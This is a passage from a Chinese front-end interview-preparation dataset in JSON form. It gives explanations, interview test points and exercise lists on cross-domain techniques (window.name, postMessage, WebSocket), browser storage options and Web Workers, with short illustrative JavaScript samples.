中间代理页，与a.html同域，内容为空即可。  \n\n3）b.html：([www.domain2.com/b.html](http://www.domain2.com/b.html \"http://www.domain2.com/b.html\"))\n\n```bash\n<script>\n    window.name = 'This is domain2 data!';\n</script>\n```\n\n  通过iframe的src属性由外域转向本地域，跨域数据即由iframe的window.name从外域传递到本地域。这个就巧妙地绕过了浏览器的跨域访问限制，但同时它又是安全操作。\n\n### 8、postMessage跨域\n\n  postMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：\n\n-   页面和其打开的新窗口的数据传递\n-   多窗口之间消息传递\n-   页面与嵌套的iframe消息传递\n-   上面三个场景的跨域数据传递\n\n用法：postMessage(data,origin)方法接受两个参数：\n\n-   **data**： html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。\n-   **origin**： 协议+主机+端口号，也可以设置为\"\\*\"，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为\"/\"。\n\n1）a.html：([www.domain1.com/a.html](http://www.domain1.com/a.html \"http://www.domain1.com/a.html\"))\n\n```bash\n<iframe id=\"iframe\" src=\"http://www.domain2.com/b.html\" style=\"display:none;\"></iframe>\n<script>       \n    var iframe = document.getElementById('iframe');\n    iframe.onload = function() {\n        var data = {\n            name: 'aym'\n        };\n        // 向domain2传送跨域数据\n        iframe.contentWindow.postMessage(JSON.stringify(data), 'http://www.domain2.com');\n    };\n\n    // 接受domain2返回数据\n    window.addEventListener('message', function(e) {\n        alert('data from domain2 ---> ' + e.data);\n    }, false);\n</script>\n```\n\n2）b.html：([www.domain2.com/b.html](http://www.domain2.com/b.html \"http://www.domain2.com/b.html\"))\n\n```bash\n<script>\n    // 接收domain1的数据\n    window.addEventListener('message', function(e) {\n        alert('data from domain1 ---> ' + e.data);\n\n        var data = JSON.parse(e.data);\n        if (data) {\n            data.number = 16;\n\n            // 处理后再发回domain1\n            window.parent.postMessage(JSON.stringify(data), 'http://www.domain1.com');\n        }\n    }, false);\n</script>\n```\n\n### 9、WebSocket协议跨域\n\n  WebSocket protocol是HTML5一种新的协议。它实现了浏览器与服务器全双工通信，同时允许跨域通讯，是server push技术的一种很好的实现。 原生WebSocket API使用起来不太方便，我们使用Socket.io，它很好地封装了webSocket接口，提供了更简单、灵活的接口，也对不支持webSocket的浏览器提供了向下兼容。  \n1）前端代码：\n\n```bash\n<div>user input：<input type=\"text\"></div>\n<script src=\"https://cdn.bootcss.com/socket.io/2.2.0/socket.io.js\"></script>\n<script>\nvar socket = io('http://www.domain2.com:8080');\n\n// 连接成功处理\nsocket.on('connect', function() {\n    // 监听服务端消息\n    socket.on('message', function(msg) {\n        console.log('data from server: ---> ' + msg); \n    });\n\n    // 监听服务端关闭\n    socket.on('disconnect', function() { \n        console.log('Server socket has closed.'); \n    });\n});\n\ndocument.getElementsByTagName('input')[0].onblur = function() {\n    socket.send(this.value);\n};\n</script>\n```\n\n2）Nodejs socket后台：\n\n```bash\nvar http = require('http');\nvar socket = require('socket.io');\n\n// 启http服务\nvar server = http.createServer(function(req, res) {\n    res.writeHead(200, {\n        'Content-type': 'text/html'\n    });\n    res.end();\n});\n\nserver.listen('8080');\nconsole.log('Server is running at port 8080...');\n\n// 监听socket连接\nsocket.listen(server).on('connection', function(client) {\n    // 接收信息\n    client.on('message', function(msg) {\n        client.send('hello：' + msg);\n        console.log('data from client: ---> ' + msg);\n    });\n\n    // 断开处理\n    client.on('disconnect', function() {\n        console.log('Client socket has closed.'); \n    });\n});\n```\n\n## 小结\n\n以上就是9种常见的跨域解决方案：\n* jsonp（只支持get请求，支持老的IE浏览器）适合加载不同域名的js、css，img等静态资源；\n* CORS（支持所有类型的HTTP请求，但浏览器IE10以下不支持）适合做ajax各种跨域请求；\n* Nginx代理跨域和nodejs中间件跨域原理都相似，都是搭建一个服务器，直接在服务器端请求HTTP接口，这适合前后端分离的前端项目调后端接口。\n* document.domain+iframe适合主域名相同，子域名不同的跨域请求。",
    "testPoint": "### 1. **跨域的基本概念**\n   - 什么是跨域？为什么浏览器会限制跨域请求？\n   - 你能解释 **同源策略（Same-Origin Policy）** 吗？同源策略的规则是什么？\n\n### 2. **跨域限制的场景**\n   - 在哪些场景下会遇到跨域问题？比如，`XMLHttpRequest` 请求、`fetch` 请求、`iframe` 等。\n   - 什么是简单请求（Simple Request）和复杂请求（Preflighted Request）？它们在跨域访问中有什么区别？\n\n### 3. **CORS（跨域资源共享）**\n   - 什么是 **CORS（Cross-Origin Resource Sharing）**？请简要说明其工作原理。\n   - 请解释 `Access-Control-Allow-Origin`、`Access-Control-Allow-Methods`、`Access-Control-Allow-Headers` 等 CORS 相关的响应头字段的作用。\n\n### 4. **预检请求（Preflight Request）**\n   - 什么是 **预检请求**？它在什么情况下会被触发？\n   - 在实际开发中如何避免不必要的预检请求，以减少跨域请求的开销？\n\n### 5. **JSONP（JSON with Padding）**\n   - JSONP 是什么？它如何实现跨域请求？\n   - JSONP 的局限性是什么？在什么情况下你不会选择使用 JSONP？\n\n### 6. **代理服务器解决跨域**\n   - 你如何通过 **代理服务器** 实现跨域？请解释其工作原理。\n   - 在本地开发环境中，使用 Webpack DevServer、Nginx 等代理服务解决跨域的配置方法是什么？\n\n### 7. **跨域资源嵌入**\n   - 哪些 HTML 标签可以跨域嵌入资源？例如 `<img>`、`<script>`、`<link>` 等标签。\n   - 在使用 `<script>`、`<img>` 标签请求外部资源时，为什么不受同源策略限制？\n\n### 8. **PostMessage 跨域通信**\n   - 什么是 `postMessage`？如何使用它在不同源的窗口或 iframe 之间进行安全的跨域通信？\n   - 如何确保 `postMessage` 传递的数据安全？在使用 `postMessage` 时应注意哪些安全性问题？\n\n### 9. **跨域的安全性**\n   - 在使用 CORS 时，如何确保跨域请求的安全？例如 `Access-Control-Allow-Origin` 设置为 `*` 时的安全隐患是什么？\n   - 如果后端需要授权特定域名的跨域请求，如何实现动态设置 `Access-Control-Allow-Origin`？\n\n### 10. **实际应用场景与问题解决**\n   - 在实际开发中，你遇到过哪些跨域问题？请描述一个具体的案例以及你的解决方法。\n   - 在微前端架构、前后端分离项目中，如何处理跨域问题以确保数据安全和资源访问的便捷性？",
    "exerciseKeyList": "[\"6843e240-9534-4371-8b64-ba76b4aa8ed4\",\"ce6357ce-cce3-4ccc-90d8-7fe7704f3312\",\"20f1385d-4442-43c5-bb20-2a53a9bfc6c6\",\"e41a4651-2c23-43c7-853c-cdf6039325f6\",\"56e56a05-99c7-4701-ae72-e06d2c6a4d42\",\"87408912-b244-4727-951c-65993c6dbcff\",\"b4001078-1e40-481b-8fcd-c4d48e6dd855\",\"03d5dfc7-9bb9-4129-9145-b4da4d4fa11f\",\"38c7340e-cb35-43e0-8ea0-20e75b2780a5\",\"3538f4eb-5b78-4ffc-aeae-ccfdd45976a4\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 23,
    "createAt": "2024-10-01T14:03:17.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "03d5dfc7-9bb9-4129-9145-b4da4d4fa11f",
        "title": "说说webpack proxy工作原理？为什么能解决跨域?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-05T15:33:37.000Z",
        "updateAt": "2024-01-25T19:07:54.000Z"
      },
      {
        "exerciseKey": "20f1385d-4442-43c5-bb20-2a53a9bfc6c6",
        "title": "JSONP 是如何实现跨域的?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:17:52.000Z"
      },
      {
        "exerciseKey": "3538f4eb-5b78-4ffc-aeae-ccfdd45976a4",
        "title": "什么是跨域？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:49:49.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "38c7340e-cb35-43e0-8ea0-20e75b2780a5",
        "title": "Vue项目中如何解决跨域问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T03:51:10.000Z",
        "updateAt": "2024-08-10T17:04:48.000Z"
      },
      {
        "exerciseKey": "56e56a05-99c7-4701-ae72-e06d2c6a4d42",
        "title": "前端怎么实现跨域请求？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T15:50:15.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "6843e240-9534-4371-8b64-ba76b4aa8ed4",
        "title": "postMessage 是如何解决跨域问题的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:15:18.000Z"
      },
      {
        "exerciseKey": "87408912-b244-4727-951c-65993c6dbcff",
        "title": "怎么解决canvas中获取跨域图片数据的问题？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-08T15:35:58.000Z",
        "updateAt": "2024-08-10T17:06:15.000Z"
      },
      {
        "exerciseKey": "b4001078-1e40-481b-8fcd-c4d48e6dd855",
        "title": "浏览器为什么要有跨域限制？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T02:49:50.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      },
      {
        "exerciseKey": "ce6357ce-cce3-4ccc-90d8-7fe7704f3312",
        "title": "CORS 是如何实现跨域的？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2025-07-16T12:44:36.000Z"
      },
      {
        "exerciseKey": "e41a4651-2c23-43c7-853c-cdf6039325f6",
        "title": "跨域时怎么处理 cookie？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:34:09.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      }
    ]
  },
  "29": {
    "id": 29,
    "tagId": 10,
    "title": "前端存储",
    "explanation": "## 什么是前端存储\n\n开门见山。前端存储就是通过前端技术来存储一段信息，然后在同源下的不同页面中都可以获取到已存储信息的一种策略。\n\n## 前端存储的作用\n\n-   方便网页的加载，避免了在发送请求收到响应前页面的空白期\n-   可以在非强制性要求实时更新时减少向服务端的请求，加快渲染速度\n-   在网络不佳或无网时仍有离线数据可以查看\n\n## 有哪些前端存储方案\n\n![04da58a55a12360200a89d3e862cd802.png](https://static.ecool.fun//article/a2a9d31d-8275-4b72-95f4-a25b4e56a8cd.awebp)\n\n如图，一共有5种前端存储方案。大致可以分为3类：\n\n-   Cookie\n-   WebStorage：LocalStorage、SessionStorage\n-   数据库存储：IndexedDB、WebSQL\n\n先做一个简单对比：\n\n![1.jpg](https://static.ecool.fun//article/c0c0631f-0f8b-404c-8d1a-4ea7ef604046.awebp)\n\n下面我们详细介绍。\n\n## Cookie\n\nCookie 的工作流程：\n\n![9.jpg](https://static.ecool.fun//article/8abcb4e7-581f-4d2e-8667-e7c75401e421.awebp)\n\nCookie 的构成：\n\n![3.png](https://static.ecool.fun//article/f6831dbd-6596-4e30-b31c-93afea2b97ad.awebp)\n\n![7.jpg](https://static.ecool.fun//article/42ae6b1c-8675-447a-9eb1-606bd2ecdf9d.awebp)\n\n域、路径、失效时间和安全性都是服务器给浏览器的指示，它们不会随着请求发送给服务器，**发送给服务器的只有名称与值的键值对**。\n\nCookie 的生命周期：\n\n-   如果设定了 Cookie 的过期时间，那么 Cookie 会在到期时自动失效\n-   如果没有设定过期时间，那么 Cookie 就是 session 级别的，即浏览器关闭时 Cookie 自动消失\n\nCookie 的优缺点：\n\n优点：\n\n-   可以控制过期时间，不会永久有效，有一定的安全保障\n-   可进行扩展，可跨域共享\n-   通过加密与安全传输技术，可以减少 Cookie 被破解的可能性\n-   有较高的兼容性\n\n缺点：\n\n-   存储大小最多4KB\n-   存储数量根据浏览器或浏览器版本的不同而不同，并且每个域最多20条\n-   请求头上的数据容易被拦截攻击\n-   存储的数据只能是字符串类型\n\n操作 Cookie：\n\n```javascript\n// 设置 Cookie\n// Cookie 值必须是字符串类型，并且不支持分号、逗号以及空格，\n// 所以有时需要先使用 encodeURIComponent() 进行编码，或者使用 JSON.stringify() 进行序列化\ndocument.cookie = '键1=值1;键2=值2;键n=值n';\n\n// 读取 Cookie\n// 有时需要使用 decodeURIComponent() 或者 JSON.parse()\ndocument.cookie\n\n// 修改 Cookie\n// 如果键不存在，就新增；否则就修改\ndocument.cookie = '已经存储过的键=新值';\n\n// 删除 Cookie\ndocument.cookie = '要删除的键=任意值;max-age=0';\n```\n\n## WebStorage\n\nWebStorage 是 HTML5 新加的，WebStorage（Web 存储） 分为 LocalStorage（本地存储） 和 SessionStorage（会话存储）。\n\nWebStorage 的优势：\n\n-   解决了 Cookie 的一些限制，同时存储一些需要严格控制在客户端且不需要发送给服务器的数据\n-   提供了除 Cookie 之外的另一种存储会话的途径\n-   提供了一种大容量存储空间来跨会话存储数据的途径\n\n比较一下 LocalStorage 和 SessionStorage 的区别：\n\n![14.jpg](https://static.ecool.fun//article/482161d4-275d-4862-94d7-8effc1701be0.awebp)\n\nWebStorage 跟 Cookie 相比：\n\n![12.jpg](https://static.ecool.fun//article/fb1f9284-05b2-42f2-9c5b-a04407e81b95.awebp)\n\n## IndexedDB\n\nIndexedDB 是浏览器提供的本地数据库，是 HTML5 新加的，允许存储大量数据，提供查找接口，还能建立索引。这些都是 WebStorage 不具备的。就数据库而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），接近于 NoSQL 数据库，以键值对的形式进行存储，可以快速进行读取操作，非常适合 Web 场景，同时使用 JS 进行操作会很方便。\n\n## WebSQL\n\nWebSQL 是在浏览器端运行的轻量级数据库，WebSQL 类似于 SQLite，更像是关系型数据库，使用 SQL 查询数据。注意，这种本地数据存储方案已经被废弃。",
    "testPoint": "### 1. **前端存储的基本概念**\n   - 在前端开发中，为什么需要使用本地存储？本地存储的常见应用场景有哪些？\n   - 请简要说明常见的前端存储方式有哪些？例如 **LocalStorage**、**SessionStorage**、**Cookies**、**IndexedDB** 等。\n\n### 2. **LocalStorage 和 SessionStorage**\n   - **LocalStorage** 和 **SessionStorage** 有哪些相同点和不同点？它们各自的适用场景是什么？\n   - LocalStorage 的存储限制是什么？在不同浏览器中大约能存储多大容量的数据？\n   - 请解释如何使用 LocalStorage 和 SessionStorage 存储和读取数据。\n\n### 3. **Cookies**\n   - 什么是 **Cookie**？Cookie 与 LocalStorage、SessionStorage 的区别是什么？\n   - 请解释 Cookie 中的常见属性（如 `expires`、`max-age`、`domain`、`path`、`secure` 和 `HttpOnly`），这些属性的作用是什么？\n   - 在前端开发中，什么时候适合使用 Cookie？它主要用于哪些场景？\n\n### 4. **IndexedDB**\n   - **IndexedDB** 是什么？它适用于哪些场景？\n   - 请简要说明如何使用 IndexedDB 存储数据？比如数据库的创建、对象存储的创建以及数据的增删改查操作。\n   - 在需要存储大量结构化数据时，为什么 IndexedDB 比 LocalStorage 更合适？\n\n### 5. **Web SQL（已废弃）**\n   - 你是否了解 **Web SQL**？它与 IndexedDB 的区别是什么？\n   - 虽然 Web SQL 已被废弃，你能描述它的工作原理吗？例如它如何使用 SQL 语句操作数据。\n\n### 6. **存储的安全性**\n   - 如何保障前端存储的安全性？在存储敏感数据时，应该注意哪些问题？\n   - 为什么不推荐在 LocalStorage 中存储敏感信息（如 JWT）？如何避免 CSRF 和 XSS 攻击导致的安全隐患？\n   - 在存储敏感信息时，你是否使用过加密？如何通过加密增强存储的安全性？\n\n### 7. **存储的同步与跨页面共享**\n   - 在单页面应用中，如何实现 LocalStorage 的跨页面共享？LocalStorage 是否会在多个浏览器标签页间自动同步？\n   - 如果需要在多个标签页间共享数据，你如何通过 LocalStorage 实现监听和更新？（例如 `storage` 事件）\n\n### 8. **前端存储的容量与性能**\n   - LocalStorage、SessionStorage、Cookie 和 IndexedDB 的容量各是多少？在不同浏览器中有何差异？\n   - 如果需要存储大量数据，如何在性能和容量上平衡？IndexedDB 与 LocalStorage 在性能上的差异是什么？\n\n### 9. **持久性和过期策略**\n   - LocalStorage、SessionStorage 和 Cookie 的持久性如何？在什么条件下它们会被清除？\n   - 如果需要给 LocalStorage 中的数据设置过期时间，如何实现自动清理？\n\n### 10. **使用前端存储的实际案例**\n   - 在项目中，你是如何选择前端存储的方式？是否考虑过存储的安全性、容量和性能？\n   - 你遇到过前端存储导致的 bug 或数据同步问题吗？请描述问题以及如何解决的。\n\n### 11. **组合应用与最佳实践**\n   - 在实际应用中，你是否将不同的存储方式组合使用过？比如将 Cookie 和 LocalStorage 配合使用来优化用户体验和安全性。\n   - 在大型项目中，如何合理规划前端存储方案？例如数据的层次结构、过期策略以及对不同模块的存储隔离。\n\n### 12. **Service Worker 和 Cache API**\n   - Service Worker 和 Cache API 可以用于前端存储吗？它们适合存储哪些类型的数据？\n   - 在实现 PWA（渐进式 Web 应用）时，如何使用 Cache API 缓存资源以实现离线访问？",
    "exerciseKeyList": "[\"8a109788-5551-44a0-ba39-526632145959\",\"6bea229f-8bae-4472-bedb-1260ec4aea47\",\"e41a4651-2c23-43c7-853c-cdf6039325f6\",\"94393532-0d43-407f-8168-73bc6fd523a3\",\"718abe6b-08ab-4669-bc33-187fabad8fec\",\"596630fb-95e6-43c4-a1cc-48683233ae76\",\"aef19252-da7d-447d-a9c5-3eb0d191901d\",\"d86b13c6-54f1-423a-80c5-e52c24f71e30\",\"d370ad63-b673-4887-899d-6446148bcfe7\",\"a6c99a3d-88a1-4806-8443-89368f608ba1\",\"31809048-eda0-40d6-847a-0d04d28b6432\",\"ec9fd724-c3ab-453f-818c-a4909155c5f6\",\"3f9c98d1-28f5-46fe-ba4b-ee7d9f6107cf\"]",
    "vipLimit": 0,
    "level": 2,
    "pointOrder": 24,
    "createAt": "2024-10-01T14:18:33.000Z",
    "updateAt": "2024-11-08T14:40:48.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "31809048-eda0-40d6-847a-0d04d28b6432",
        "title": "请说说cookie与session有什么区别？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-06T13:53:28.000Z",
        "updateAt": "2024-08-10T17:05:12.000Z"
      },
      {
        "exerciseKey": "3f9c98d1-28f5-46fe-ba4b-ee7d9f6107cf",
        "title": "在域名 A 的网站上，跨域请求域名 B 上的接口，怎么在跨域请求中携带域名 B 的 Cookie 呢？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:14.000Z",
        "updateAt": "2024-10-30T01:37:42.000Z"
      },
      {
        "exerciseKey": "596630fb-95e6-43c4-a1cc-48683233ae76",
        "title": "说说你对cookie的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-02-06T13:32:12.000Z",
        "updateAt": "2024-08-10T17:06:08.000Z"
      },
      {
        "exerciseKey": "6bea229f-8bae-4472-bedb-1260ec4aea47",
        "title": "cookie 怎么设置只在 https 时携带？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-09-06T01:26:15.000Z",
        "updateAt": "2024-08-10T17:06:58.000Z"
      },
      {
        "exerciseKey": "718abe6b-08ab-4669-bc33-187fabad8fec",
        "title": "cookie、localStorage和sessionStorage 三者之间有什么区别",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-03-15T16:01:01.000Z",
        "updateAt": "2024-08-10T17:06:17.000Z"
      },
      {
        "exerciseKey": "8a109788-5551-44a0-ba39-526632145959",
        "title": "cookie 构成部分有哪些",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:31.000Z",
        "updateAt": "2024-08-15T19:17:33.000Z"
      },
      {
        "exerciseKey": "94393532-0d43-407f-8168-73bc6fd523a3",
        "title": "cookie 的有效时间设置为 0 会怎么样",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-16T05:08:54.000Z",
        "updateAt": "2023-09-10T19:17:28.000Z"
      },
      {
        "exerciseKey": "a6c99a3d-88a1-4806-8443-89368f608ba1",
        "title": "使用cookie、session维持登录状态的原理是什么？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:35:18.000Z",
        "updateAt": "2024-08-10T17:05:47.000Z"
      },
      {
        "exerciseKey": "aef19252-da7d-447d-a9c5-3eb0d191901d",
        "title": "什么是 Samesite Cookie 属性？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-11-17T14:33:13.000Z",
        "updateAt": "2024-08-10T17:05:59.000Z"
      },
      {
        "exerciseKey": "d370ad63-b673-4887-899d-6446148bcfe7",
        "title": "cookie中的 HttpOnly 属性有什么用途？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:44:32.000Z",
        "updateAt": "2024-08-10T17:05:48.000Z"
      },
      {
        "exerciseKey": "d86b13c6-54f1-423a-80c5-e52c24f71e30",
        "title": "Cookie 的 SameSite 属性有什么作用？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-09-25T09:49:45.000Z",
        "updateAt": "2024-08-10T17:05:48.000Z"
      },
      {
        "exerciseKey": "e41a4651-2c23-43c7-853c-cdf6039325f6",
        "title": "跨域时怎么处理 cookie？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-07-17T11:34:09.000Z",
        "updateAt": "2024-08-10T17:06:49.000Z"
      },
      {
        "exerciseKey": "ec9fd724-c3ab-453f-818c-a4909155c5f6",
        "title": "如何实现可过期的 localStorage 数据?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:16:26.000Z"
      }
    ]
  },
  "30": {
    "id": 30,
    "tagId": 10,
    "title": "WebWorker",
    "explanation": "## 前言\n\n先来聊聊单线程的Javascript\n\n众所周知，js最初设计是运行在浏览器中的，为了防止多个线程同时操作DOM，带来渲染冲突问题，所以js执行器被设计成单线程。但随着前端技术的发展，js能力远不止如此，当我们遇到需要大量计算的场景时（比如图像处理、视频解码等），js线程往往会被长时间阻塞，甚至造成页面卡顿，影响用户体验。为了解决单线程带来的这一弊端，Web Worker 应运而生。\n\n## 1\\. Web Worker\n\n### 1.1 `Web Worker` 是什么\n\n`Web Worker` 是 HTML5 标准的一部分，这一规范定义了一套 API，允许我们在 js 主线程之外开辟新的 Worker 线程，并将一段 js 脚本运行其中，它赋予了开发者利用 js 操作多线程的能力。\n\n因为是独立的线程，Worker 线程与 js 主线程能够同时运行，互不阻塞。所以，在我们有大量运算任务时，可以把运算任务交给 Worker 线程去处理，当 Worker 线程计算完成，再把结果返回给 js 主线程。这样，js 主线程只用专注处理业务逻辑，不用耗费过多时间去处理大量复杂计算，从而减少了阻塞时间，也提高了运行效率，页面流畅度和用户体验自然而然也提高了。\n\n### 1.2 `Web Worker` 能干些什么\n\n虽然 Worker 线程是在浏览器环境中被唤起，但是它与当前页面窗口运行在不同的全局上下文中，我们常用的顶层对象 `window`，以及 `parent` 对象在 Worker 线程上下文中是不可用的。另外，在 Worker 线程上下文中，操作 DOM 的行为也是不可行的，`document`对象也不存在。但是，`location`和`navigator`对象可以以可读方式访问。除此之外，绝大多数 Window 对象上的方法和属性，都被共享到 Worker 上下文全局对象 [WorkerGlobalScope](https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope \"https://developer.mozilla.org/en-US/docs/Web/API/WorkerGlobalScope\") 中。同样，Worker 线程上下文也存在一个顶级对象 `self`。\n\n详细信息请参考：[Functions and classes available to Web Workers](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers \"https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Functions_and_classes_available_to_workers\")\n\n## 2\\. Web Worker 使用\n\n### 2.1 创建 `worker`\n\n创建 `worker` 只需要通过 `new` 调用 `Worker()` 构造函数即可，它接收两个参数\n\n```js\nconst worker = new Worker(path, options);\n```\n\n| 参数 | 说明 |\n| --- | --- |\n| path | 有效的js脚本的地址，必须遵守同源策略。无效的js地址或者违反同源策略，会抛出`SECURITY_ERR` 类型错误 |\n| options.type | 可选，用以指定 worker 类型。该值可以是 `classic` 或 `module`。 如未指定，将使用默认值 `classic` |\n| options.credentials | 可选，用以指定 worker 凭证。该值可以是 `omit`, `same-origin`，或 `include`。如果未指定，或者 type 是 `classic`，将使用默认值 `omit` (不要求凭证) |\n| options.name | 可选，在 [`DedicatedWorkerGlobalScope`](https://developer.mozilla.org/zh-CN/docs/Web/API/DedicatedWorkerGlobalScope \"https://developer.mozilla.org/zh-CN/docs/Web/API/DedicatedWorkerGlobalScope\") 的情况下，用来表示 worker 的 scope 的一个 [`DOMString`](https://developer.mozilla.org/zh-CN/docs/conflicting/Web/JavaScript/Reference/Global_Objects/String_6fa58bba0570d663099f0ae7ae8883ab \"https://developer.mozilla.org/zh-CN/docs/conflicting/Web/JavaScript/Reference/Global_Objects/String_6fa58bba0570d663099f0ae7ae8883ab\") 值，主要用于调试目的。 |\n\n### 2.2 js 主线程与 worker 线程数据传递\n\n主线程与 worker 线程都是通过 `postMessage` 方法来发送消息，以及监听 `message` 事件来接收消息。如下所示：\n\n```js\n// main.js（主线程）\n\nconst myWorker = new Worker('/worker.js'); // 创建worker\n\nmyWorker.addEventListener('message', e => { // 接收消息\n    console.log(e.data); // Greeting from Worker.js，worker线程发送的消息\n});\n\n// 这种写法也可以\n// myWorker.onmessage = e => { // 接收消息\n//    console.log(e.data);\n// };\n\nmyWorker.postMessage('Greeting from Main.js'); // 向 worker 线程发送消息，对应 worker 线程中的 e.data\n```\n\n```js\n// worker.js（worker线程）\nself.addEventListener('message', e => { // 接收到消息\n    console.log(e.data); // Greeting from Main.js，主线程发送的消息\n    self.postMessage('Greeting from Worker.js'); // 向主线程发送消息\n});\n```\n\n好了，一个简单 worker 线程就创建成功了。\n\n`postMessage()` 方法接收的参数可以是字符串、对象、数组等。具体我们在#2.7讨论。\n\n主线程与 worker 线程之间的数据传递是传值而不是传地址。所以你会发现，即使你传递的是一个`Object`，并且被直接传递回来，接收到的也不是原来的那个值了。\n\n```js\n// main.js（主线程）\nconst myWorker = new Worker('/worker.js');\n\nconst obj = {name: '小明'};\nmyWorker.addEventListener('message', e => { \n    console.log(e.data === obj); // false\n});\nmyWorker.postMessage(obj);\n```\n\n```js\n// worker.js（worker线程）\nself.addEventListener('message', e => {\n    self.postMessage(e.data); // 将接收到的数据直接返回\n});\n```\n\n### 2.3 监听错误信息\n\nweb worker 提供两个事件监听错误，`error` 和 `messageerror`。这两个事件的区别是:\n\n| 事件 | 描述 |\n| --- | --- |\n| `error` | 当worker内部出现错误时触发 |\n| `messageerror` | 当 `message` 事件接收到无法被反序列化的参数时触发 |\n\n监听方式跟接收消息一致：\n\n```js\n// main.js（主线程）\nconst myWorker = new Worker('/worker.js'); // 创建worker\n\nmyWorker.addEventListener('error', err => {\n    console.log(err.message);\n});\nmyWorker.addEventListener('messageerror', err => {\n    console.log(err.message)\n});\n```\n\n```js\n// worker.js（worker线程）\nself.addEventListener('error', err => {\n    console.log(err.message);\n});\nself.addEventListener('messageerror', err => {\n    console.log(err.message);\n});\n```\n\n### 2.4 关闭 worker 线程\n\nworker 线程的关闭在主线程和 worker 线程都能进行操作，但对 worker 线程的影响略有不同。\n\n```js\n// main.js（主线程）\nconst myWorker = new Worker('/worker.js'); // 创建worker\nmyWorker.terminate(); // 关闭worker\n```\n\n```js\n// worker.js（worker线程）\nself.close(); // 直接执行close方法就ok了\n```\n\n无论是在主线程关闭 worker，还是在 worker 线程内部关闭 worker，worker 线程当前的 Event Loop 中的任务会继续执行。至于 worker 线程下一个 Event Loop 中的任务，则会被直接忽略，不会继续执行。\n\n区别是，在主线程手动关闭 worker，主线程与 worker 线程之间的连接都会被立刻停止，即使 worker 线程当前的 Event Loop 中仍有待执行的任务继续调用 `postMessage()` 方法，但主线程不会再接收到消息。\n\n在 worker 线程内部关闭 worker，不会直接断开与主线程的连接，而是等 worker 线程当前的 Event Loop 所有任务执行完，再关闭。也就是说，在当前 Event Loop 中继续调用 `postMessage()` 方法，主线程还是能通过监听`message`事件收到消息的。\n\n如下两个例子可以很好说明这一点：\n\n**在主线程关闭 worker**\n\n-   worker 线程在接受到消息后，立即向主线程回复一条消息。然后利用计时器添加一个宏任务；利用 Promise 添加一个微任务；执行一个 for 循环。目的都是向主线程回复一条消息。\n-   主线程在接收到消息后立即关闭 worker 线程。\n\n大家可以思考一下，主线程会接收到哪些消息呢，控制台会打印出哪些信息呢？\n\n```js\n// main.js（主线程）\nconst myWorker = new Worker('/worker.js'); // 创建 worker\n\nmyWorker.addEventListener('message', e => {\n    console.log(e.data);\n    myWorker.terminate(); // 关闭 worker\n});\n\nmyWorker.postMessage('Greeting from Main.js');\n```\n\n```js\n// worker.js（worker线程）\n\nself.addEventListener('message', e => {\n\n    postMessage('Greeting from Worker');\n    \n    setTimeout(() => {\n        console.log('setTimeout run');\n        postMessage('Greeting from SetTimeout');\n    });\n    \n    Promise.resolve().then(() => {\n        console.log('Promise run');\n        postMessage('Greeting from Promise');\n    })\n    \n    for (let i = 0; i < 1001; i++) {\n        if (i === 1000) {\n            console.log('Loop run');\n            postMessage('Greeting from Loop');\n        }\n    }\n    \n});\n```\n\n运行结果如下：\n\n![image.png](https://static.ecool.fun//article/975c0ea9-f203-4619-af60-1a4b5bee6189.awebp)\n\n-   主线程只会接收到 worker 线程第一次通过 `postMessage()` 发送的消息，后面的消息不会接收到；\n-   worker 线程当前 Event Loop 里的任务会继续执行，包括微任务；\n-   worker 线程里 setTimeout 创建的下一个 Event Loop 任务队列没有执行。\n\n**在 worker 线程内部关闭 worker**\n\n对上述例子稍作修改，将关闭 worker 的事件放到 worker 线程内部，大家觉得又会打印出什么呢\n\n```js\n// main.js（主线程）\nconst myWorker = new Worker('/worker.js'); // 创建 